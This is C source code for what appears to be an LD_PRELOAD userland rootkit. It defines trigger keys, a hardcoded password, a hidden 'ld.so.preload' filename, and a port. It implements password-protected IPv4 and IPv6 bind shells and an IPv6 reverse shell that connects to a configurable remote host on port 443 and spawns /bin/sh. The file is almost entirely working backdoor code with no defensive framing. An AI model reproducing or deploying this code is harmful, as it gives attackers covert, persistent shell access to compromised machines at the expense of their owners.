#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <dlfcn.h>
#include <dirent.h>
#include <arpa/inet.h>

//bind-shell definitions
#define KEY_4 "notavaliduser4"
#define KEY_6 "notavaliduser6"
#define PASS "areallysecurepassword1234!@#$"
#define LOC_PORT 65065

//reverse-shell definitions
#define KEY_R_4 "reverseshell4"
#define KEY_R_6 "reverseshell6"
#define REM_HOST4 "127.0.0.1"
#define REM_HOST6 "::1"
#define REM_PORT 443

//filename to hide
#define FILENAME "ld.so.preload"

#define KEY_PORT "FE29"

int ipv6_bind(void)
{
    struct sockaddr_in6 addr; 
    addr.sin6_family = AF_INET6;
    addr.sin6_port = htons(LOC_PORT);
    addr.sin6_addr = in6addr_any;

    int sockfd = socket(AF_INET6, SOCK_STREAM, 0);

    const static int optval = 1;
    setsockopt(sockfd, IPPROTO_IPV6, IPV6_V6ONLY, &optval, sizeof(optval));

    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

    bind(sockfd, (struct sockadr*) &addr, sizeof(addr));

    listen(sockfd, 0);

    int new_sockfd = accept(sockfd, NULL, NULL);

    for(int count=0; count<3; count++)
    {
        dup2(new_sockfd, count);

    }

    char input[30];

    read(new_sockfd, input, sizeof(input));
    input[strcspn(input, "\n")] = 0;
    if(strcmp(input, PASS) ==0)
    {
        execve("/bin/sh", NULL, NULL);
        close(sockfd);

    }
    else{
        shutdown(new_sockfd, SHUT_RDWR);
        close(sockfd);
    }


}



int ipv4_bind(void)
{
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(LOC_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;


    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    const static int optval = 1;

    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

    bind(sockfd, (struct sockaddr*) &addr, sizeof(addr));

    listen(sockfd, 0);

    int new_sockfd = accept(sockfd, NULL, NULL);

    for (int count=0; count < 3; count++)
    {
        dup2(new_sockfd, count);

    }

    char input[30];

    read(new_sockfd, input, sizeof(input));
    input[strcspn(input, "\n")] = 0;
    if (strcmp(input, PASS) ==0)
    {
        execve("/bin/sh", NULL, NULL);
        close(sockfd);

    }
    else
    {
        shutdown(new_sockfd, SHUT_RDWR);
        close(sockfd);
    }
}


int ipv6_rev(void)
{
    const char* host=REM_HOST6;
    struct sockaddr_in6 addr;
    addr.sin6_family = AF_INET6;
    addr.sin6_port = htons(REM_PORT);
    inet_pton(AF_INET6, host, &addr.sin6_addr);

    struct sockaddr_in6 client;
    client.sin6_family = AF_INET6;
    client.sin6_port = htons(LOC_PORT);
    client.sin6_addr = in6addr_any;

    int sockfd = socket(AF_INET6, SOCK_STREAM, 0);

    bind(sockfd, (struct sockaddr*) &client, sizeof(client));
    connect(sockfd, (struct sockaddr*) &addr, sizeof(addr));

    for(int count=0; count < 3; count++)
    {
        dup2(sockfd, count);

    }

    execve("/bin/sh", NULL, NULL);
    close(sockfd);

    return 0;
}



